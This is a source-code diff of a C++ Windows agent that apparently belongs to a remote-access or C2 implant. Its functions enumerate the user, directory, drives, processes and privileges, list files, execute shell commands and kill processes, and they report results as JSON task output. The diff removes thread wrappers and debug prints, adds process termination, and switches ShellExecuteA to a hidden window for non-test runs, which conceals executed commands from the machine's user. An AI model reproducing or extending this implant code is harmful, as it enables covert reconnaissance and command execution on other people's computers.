@@ -148,23 +148,6 @@ std::string whoami()
 	return output;
 }
 
-DWORD WINAPI whoami_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-
-	// Perform pwd and stuff into json blob
-	(*j)["task_output"][i] = whoami();
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
-}
-
 std::string pwd()
 {
 	TCHAR directory[UNLEN + 1];
@@ -173,23 +156,6 @@ std::string pwd()
 	std::wstring directory_w(directory);
 	std::string directory_s(directory_w.begin(), directory_w.end());
 	return directory_s;
-}
-
-DWORD WINAPI pwd_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-
-	// Perform pwd and stuff into json blob
-	(*j)["task_output"][i] = pwd();
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
 }
 
 std::string drives()
@@ -209,23 +175,6 @@ std::string drives()
 		drives_bit = drives_bit >> 1; //right shift 
 	}
 	return return_string;
-}
-
-DWORD WINAPI drives_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-
-	// Perform pwd and stuff into json blob
-	(*j)["task_output"][i] = drives();
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
 }
 
 //https://docs.microsoft.com/en-us/windows/desktop/toolhelp/taking-a-snapshot-and-viewing-processes
@@ -292,23 +241,6 @@ std::string ps()
 	return return_string;
 }
 
-DWORD WINAPI ps_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-
-	// Perform pwd and stuff into json blob
-	(*j)["task_output"][i] = ps();
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
-}
-
 std::string privs()
 {
 	std::string return_string = "";
@@ -347,23 +279,6 @@ std::string privs()
 		}
 	}
 	return return_string;
-}
-
-DWORD WINAPI privs_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-
-	// Perform pwd and stuff into json blob
-	(*j)["task_output"][i] = privs();
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
 }
 
 //https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea
@@ -448,25 +363,6 @@ std::string ls(std::string path)
 	return return_string;
 }
 
-DWORD WINAPI ls_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-	std::string path = thread_input->input;
-
-	// Perform ls and stuff into json blob
-	(*j)["task_output"][i] = ls(path);
-	(*j)["task_status"][i] = "complete";
-
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
-}
-
 std::string shell_exec(std::string user_input)
 {
 	std::string return_string = "no output";
@@ -476,30 +372,12 @@ std::string shell_exec(std::string user_input)
 	{
 		parameter = user_input.substr(user_input.find(' '), std::string::npos);
 	}
-	//set last paramater to 0 when not testing
-	if ((int)ShellExecuteA(NULL, NULL, file.c_str(), parameter.c_str(), NULL, 3) <= 32) //Magic number from MSDN docs 
+	// switch last paramater to 3 if testing
+	if ((int)ShellExecuteA(NULL, NULL, file.c_str(), parameter.c_str(), NULL, 0) <= 32) //Magic number from MSDN docs 
 	{
 		return_string = "System Error: " + ConvertToString(GetLastError()) + "\n";
 	}
 	return return_string;
-}
-
-DWORD WINAPI shell_exec_thread(__in LPVOID lpParameter)
-{
-	// Break down LPVOID
-	createthread_in* thread_input = reinterpret_cast<createthread_in*>(lpParameter);
-	json *j = thread_input->j;
-	int i = thread_input->counter;
-	std::string path = thread_input->input;
-
-	// Perform shell_exec and stuff into json blob
-	(*j)["task_output"][i] = shell_exec(path);
-	(*j)["task_status"][i] = "complete";
-
-	// Delete structure
-	delete thread_input;
-
-	return 0;
 }
 
 std::string create_process_exec(std::string user_input)
@@ -627,17 +505,31 @@ DWORD WINAPI create_process_exec_thread(__in LPVOID lpParameter)
 	int i = thread_input->counter;
 	std::string command = thread_input->input;
 	std::string output = create_process_exec(command);
-	printf("%s\n", output.c_str());
+	
 	// Perform shell_exec and stuff into json blob
 	(*j)["task_status"][i] = "complete";
 	(*j)["task_output"][i] = output;
-	printf("updated\n");
-	
 	
 	// Delete structure
 	delete thread_input;
 
 	return 0;
+}
+
+std::string kill_process(DWORD pid)
+{
+	std::string return_string = "Failed to kill process";
+	
+	// Open handle to process
+	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+	
+	// Kill process
+	if (TerminateProcess(hProcess, NULL) != NULL)
+	{
+		return_string = "Process killed";
+	}
+
+	return return_string;
 }
 
 #endif
